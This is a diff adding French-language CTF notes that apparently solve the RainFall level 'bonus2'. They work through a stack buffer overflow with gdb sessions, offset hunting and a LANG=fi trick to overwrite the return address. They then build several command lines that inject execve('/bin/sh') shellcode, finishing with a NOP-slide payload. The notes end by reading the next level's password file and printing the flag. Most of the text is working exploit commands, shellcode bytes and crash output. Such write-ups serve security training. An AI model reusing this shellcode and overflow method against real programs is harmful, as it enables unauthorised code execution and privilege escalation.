@@ -1,0 +1,91 @@
+bonus2:
+
+idee : overwrite la return address avec un shellcode
+
+bonus2@RainFall:~$ ./bonus2 0 0
+Hello 0
+
+bonus2@RainFall:~$ ./bonus2 0 0
+Hello 0
+
+bonus2@RainFall:~$ ./bonus2 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 0
+Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0
+
+./bonus2 Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Program received signal SIGSEGV, Segmentation fault.
+0x08004242 in ?? ()
+(gdb) 
+
+semble segfault sur le deuxième argument. Le plus la moitié de l’eip uniquement est remplacée 
+
+
+idee Tentative : 
+Dans le buffer final on a Hello + un nombre precis de A et de B : On tente de décaler le buffer avec la langue. 
+
+Sur gdb on observe sur les fonctions de memcmp : 0x080485db memCMP de local14 “fr” avec “fi” 
+(gdb) x/s 0x804873d
+0x804873d:	 "fi"
+
+gdb sur le deuxieme
+(gdb) x/s 0x8048740
+0x8048740:	 "nl"
+
+on fait donc un export LANG=”fi”
+
+
+test 
+Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+Avec le changement de langue l'adresse a été entièrement écrasée 
+
+Recherche de l’offset, injection shellcode dans “A” overwrite EIP a l’address du buffer
+
+    strncpy((char *)local_60,*(char **)(param_2 + 4),0x28); → 40
+    strncpy(acStack_38,*(char **)(param_2 + 8),0x20); → 32
+
+Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAABBBBBBBBBBUUUUUVVVVV → 40 char AAAAAAAAAAAAAAAAAABBBB → 18 offset depuis le deuxieme buffer
+Hyvää päivää AAAAAAAAAAAAAAAAAAAABBBBBBBBBBUUUUUVVVVVAAAAAAAAAAAAAAAAAABBBB
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+Donc 
+premier argument 40 char : 25 shellcode + 15 de garbage
+deuxième argument : AAAAAAAAAAAAAAAAAABBBB : 18*A + addr SHELLCODE
+
+./bonus2 $(python -c ‘ print “\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80” + “A”*15 ‘ ) $(python -c ‘print “A”*18 + “shellcode address”’)  
+
+Recherche de l’address du SHELLCODE
+TEST 1) Prendre le shell code directement dans le buffer = local_4c dans greetuser. 
+0x bf ff f5 f0 = \xf0\xf5\xff\xbf = 3221222896 → buffer mais au debut du buffer il y a “Hyvää päivää ” = 13 bytes
+
+./bonus2 $(python -c ‘print “\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80” + “A”*15 ‘ ) $(python -c ‘print “A”*18 + “\xf0\xf5\xff\xbf”’)   → Cannot access memory at address 0x41414145 (avec breakpoint) 
+
++13 = 3221222909 = BF FF F5 FD = \xfd\xf5\xff\xbf
+3221222909 = BF FF F5 FD = \xfd\xf5\xff\xbf → 0x6850c000 in ?? 
+TEST 2) avec local_60 dans main ? 0x bf ff f6 a0
+strncpy(0xbffff6a0, "1\300Ph//shh/bin\211\343P\211\342S\211\341\260\013\315\200AAAAAAA"..., 40) = 0xbffff6a0
+./bonus2 $(python -c ‘print “\x90”*10 + “\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80” + “A”*5 ‘ ) $(python -c “ print “A”*2 + “\xa0\xf6\xff\xbf”*6’) 
+
+TEST 3) Autre idée avec export de l'adresse dans l’env
+Échec également. 
+il faut exporter l’address avec python : 
+export SC=$(python -c 'print("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
+sur gdb x/30s *environ nous donne l'adresse suivante : 0xbfffff24, à laquelle on ajoute 3 pour les char “SC=” → 0xbf ff ff 27 \x27\xff\xff\xbf
+
+→ Marche dans gdb mais pas dans le terminal
+
+PROBLÈME : Quel que soit l’adresse de shellcode trouve cela ne pourra pas fonctionner car les adresses de la stack dans l’environnement et dans gdb sont changees 
+
+Solution : nop-slide
+
+Dans le premier buffer inserer 2000 nopslide puis le shellcode (40 premier seulement seront copie pour le strcat final). Puis il faudra essayer de taper entre le début de cette adresse et 2000 adresses plus loin.
+
+./bonus2 $(python -c "print '\x90' * 2000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'") $(python -c "print 'a' * 18 + '\x90\xf6\xff\xbf'")
+
+cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+
